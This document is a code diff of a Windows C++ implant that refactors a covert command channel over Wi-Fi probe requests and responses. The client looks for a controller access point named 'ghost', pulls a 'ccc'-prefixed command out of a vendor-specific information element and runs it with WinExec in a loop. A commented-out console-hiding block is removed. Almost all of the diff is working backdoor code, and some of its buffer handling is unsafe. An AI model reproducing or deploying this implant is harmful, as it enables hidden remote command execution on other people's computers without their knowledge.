@@ -41,10 +41,10 @@ void init(){
 	dwCurVersion = 0;
 	dwResult = 0;
 
-	pIfList = NULL;		//网卡列表
+	pIfList = NULL;			//网卡列表
 	pIfInfo = NULL;			//网卡信息
 
-	pBssList = NULL;	//附近网络信息列表
+	pBssList = NULL;		//附近网络信息列表
 	pBssEntry = NULL;		//AP实体
 
 }
@@ -69,8 +69,8 @@ PWLAN_RAW_DATA get_payload(char *buf){
 	int         response_len = 0;
 	char            *response = NULL;
 
-	int len = sizeof(buf);					 //len为数据长度
-	char *buf = "command ok!!!!!!."; //buf为要发送的数据（最大长度240），
+	int len = strlen(buf);					 //len为数据长度
+	//char *buf = "command ok!!!!!!.";		//buf为要发送的数据（最大长度240），
 
 	//结构体初始化
 	response_len = sizeof(WLAN_RAW_DATA) - 1 + sizeof(struct ie_data) - 1 + len;
@@ -166,14 +166,13 @@ bool get_Wlan(){
 
 //发送探针
 bool sendRequest(char *ssid, PWLAN_RAW_DATA pwlan_data){
-
 	PDOT11_SSID pdo = new DOT11_SSID;
-	pdo->uSSIDLength = sizeof(ssid); //这一部分设置为动态获取
+	pdo->uSSIDLength = strlen(ssid); //这一部分设置为动态获取
 	UCHAR *ucp = NULL;
 	ucp = (UCHAR *)&pdo->ucSSID;
 	ucp = (UCHAR *)malloc(pdo->uSSIDLength);
 	memset(ucp, '\0', pdo->uSSIDLength);
-	strcpy_s((char*)ucp, sizeof(ssid), ssid);
+	strcpy_s((char*)ucp, pdo->uSSIDLength * 4, ssid);
 
 
 	dwResult = WlanScan(hClient, &pIfInfo->InterfaceGuid, NULL, pwlan_data, NULL);
@@ -189,7 +188,8 @@ bool sendRequest(char *ssid, PWLAN_RAW_DATA pwlan_data){
 	return true;
 }
 
-void probe_requset(){
+WLAN_AVAILABLE_NETWORK* getssid(char *ssid){
+	WLAN_AVAILABLE_NETWORK* pBssEntry = NULL;
 	//获取可用AP 这里需要修改
 	dwResult = WlanGetAvailableNetworkList(hClient,
 		&pIfInfo->InterfaceGuid,
@@ -200,156 +200,90 @@ void probe_requset(){
 	if (dwResult != ERROR_SUCCESS) {
 		wprintf(L"WlanGetAvailableNetworkList failed with error: %u\n",
 			dwResult);
-		//dwRetVal = 1;
-		// You can use FormatMessage to find out why the function failed
 	}
 	else {
 		//wprintf(L"WLAN_AVAILABLE_NETWORK_LIST for this interface\n");
 
-		//wprintf(L" Num Entries: %lu\n\n", pBssList->dwNumberOfItems);
+		wprintf(L" Num Entries: %lu\n\n", pBssList->dwNumberOfItems);
+		for (int j = 0; j < pBssList->dwNumberOfItems; j++) {
+			pBssEntry = (WLAN_AVAILABLE_NETWORK *)& pBssList->Network[j];
+			if (_stricmp((char *)pBssEntry->dot11Ssid.ucSSID, ssid) == 0){
+				printf("找到控制端!\n");
+				return pBssEntry;
+				//getcmd(pBssEntry, ssid);
 
-
-		for (int j = (pBssList->dwNumberOfItems) / 2; j < pBssList->dwNumberOfItems; j++) {
-			pBssEntry =
-				(WLAN_AVAILABLE_NETWORK *)& pBssList->Network[j];
-
-			//wprintf(L" 测试输出: %lu\n\n", pBssEntry->dot11BssType);
-			//获得BSS的LIST
-			//为了接收Probe Response帧，并解析出指令代码
-			PWLAN_BSS_LIST ppWlanBssList;
-
-			/*这一部分以下代码保留*/
-			DWORD dwResult2 = WlanGetNetworkBssList(hClient, &pIfInfo->InterfaceGuid,
-				&pBssEntry->dot11Ssid,
-				pBssEntry->dot11BssType,
-				pBssEntry->bSecurityEnabled,
-				NULL,
-				&ppWlanBssList);
-
-			//错误处理
-			if (dwResult2 != ERROR_SUCCESS) {
-				wprintf(L"WlanGetNetworkBssList failed with error: %u\n",
-					dwResult2);
 			}
+		}
+	}
+	return pBssEntry;
+}
+void getcmd(WLAN_AVAILABLE_NETWORK *pBssEntry, char *ssid){
+	PWLAN_BSS_LIST ppWlanBssList;
+	DWORD dwResult2 = WlanGetNetworkBssList(hClient, &pIfInfo->InterfaceGuid,
+		&pBssEntry->dot11Ssid,
+		pBssEntry->dot11BssType,
+		pBssEntry->bSecurityEnabled,
+		NULL,
+		&ppWlanBssList);
+	for (int z = 0; z < ppWlanBssList->dwNumberOfItems; z++)
+	{
+		WLAN_BSS_ENTRY *bss_entry = &ppWlanBssList->wlanBssEntries[z];
+		//添加判断是否是为目标SSID
+		printf("%s", bss_entry->dot11Ssid.ucSSID);
+		if (_stricmp((char *)bss_entry->dot11Ssid.ucSSID, ssid) == 0) {
 
-			if (pBssEntry->dot11Ssid.uSSIDLength == 0)
-				//wprintf(L"\n");
-				break;
-			else {
-				//循环遍历AVAILABLE的BSSLisst数据
-				for (int z = 0; z < ppWlanBssList->dwNumberOfItems; z++)
+		}
+		char *pp = (char *)((unsigned long)bss_entry + bss_entry->ulIeOffset);
+		int total_size = bss_entry->ulIeSize;
+		//printf("长度：%d",total_size);
+		for (;;) {
+			ie_data * ie = (struct ie_data *)pp;
+			if ((int)ie->id == 221)
+			{
+				//printf("221!!!!!\n");
+				// eg. "ccccmd /c notepad"  
+				char *magic = (char *)&ie->val[0];
+				printf(magic);
+				printf("\n");
+				if (strncmp(magic, "ccc", 3) == 0)
 				{
-					WLAN_BSS_ENTRY *bss_entry = &ppWlanBssList->wlanBssEntries[z];
-					//添加判断是否是为目标SSID
-					if (_stricmp((char *)bss_entry->dot11Ssid.ucSSID, "yunsle_ghost_tunnel") == 0) {
-						printf("找到控制端!\n");
-						char *pp = (char *)((unsigned long)bss_entry + bss_entry->ulIeOffset);
-						int total_size = bss_entry->ulIeSize;
-						//printf("长度：%d",total_size);
-						for (;;) {
-							ie_data * ie = (struct ie_data *)pp;
-							if ((int)ie->id == 221)
-							{
-								//printf("221!!!!!\n");
-								// eg. "ccccmd /c notepad"  
-								char *magic = (char *)&ie->val[0];
-								printf(magic);
-								printf("\n");
-								if (strncmp(magic, "ccc", 3) == 0)
-								{
-									char command[240] = { 0 };
-									strncpy_s(command, magic + 3, ie->len - 3);
-									//执行命令
-									printf("提取命令：%s\n", command);
-									WinExec(command, SW_NORMAL);
-									exit(1); //退出
-									break;
-								}
-							}
-							pp += sizeof(struct ie_data) - 1 + (int)ie->len;
-							total_size -= sizeof(struct ie_data) - 1 + (int)ie->len;
-							if (!total_size)
-							{
-								break;  // over  
-							}
-
-						}
-					}
+					char command[240] = { 0 };
+					strncpy_s(command, magic + 3, ie->len - 3);
+					//执行命令
+					printf("提取命令：%s\n", command);
+					WinExec(command, SW_NORMAL);
+					exit(1); //退出
+					break;
 				}
-
-				//		wprintf(L"\n");
+			}
+			pp += sizeof(struct ie_data) - 1 + (int)ie->len;
+			total_size -= sizeof(struct ie_data) - 1 + (int)ie->len;
+			if (!total_size)
+			{
+				break;  // over  
 			}
 
 		}
 	}
 }
-
 int wmain()
 {
-	/* 开始隐藏窗口 */
-	/*
-	HWND hwnd;
-	hwnd = FindWindow(L"ConsoleWindowClass", NULL);
-	if (hwnd)
-	{
-	ShowWindow(hwnd, SW_HIDE);
-	}
-	*/
-	/* 结束隐藏窗口 */
 
-	// 初始化变量
 	init();
 
-
-
-	//int iRSSI = 0;
-
-
-	PWLAN_RAW_DATA pwlan_data = get_payload("command ok!!!!!!.");
-
-
+	char *cmd = "command ok";
+	PWLAN_RAW_DATA pwlan_data = get_payload(cmd);
+	WLAN_AVAILABLE_NETWORK* ssid_entry;
+	char * ssid = "ghost";
 	while (true) {
 
-		/*
-		开始查询网卡状态
-		*/
 		if (!get_Wlan())
 			return 1;
-		/*
-		结束查询网卡状态
-		*/
-
-
-
-
-		/*
-		DWORD WINAPI WlanScan(
-		_In_             HANDLE         hClientHandle,
-		_In_       const GUID           *pInterfaceGuid,
-		_In_opt_   const PDOT11_SSID    pDot11Ssid,
-		_In_opt_   const  PWLAN_RAW_DATA  pIeData,
-		_Reserved_       PVOID          pReserved
-		);
-
-		typedef struct _DOT11_SSID {
-		ULONG uSSIDLength;
-		UCHAR ucSSID[DOT11_SSID_MAX_LENGTH];
-		} DOT11_SSID, *PDOT11_SSID;
-
-		开始设置目标ssid信息并发送探针
-
-		*/
-		if (!sendRequest("ghost_test", pwlan_data))
+		if (!sendRequest("ghost", pwlan_data))
 			return 1;
-		/*
-		结束设置目标ssid信息并发送探针
-		*/
+		ssid_entry = getssid(ssid);
+		getcmd(ssid_entry, ssid);
 
-
-		/*
-		开始发送probe request
-		*/
-		probe_requset();
 		//间隔
 		Sleep(3000);
 	}
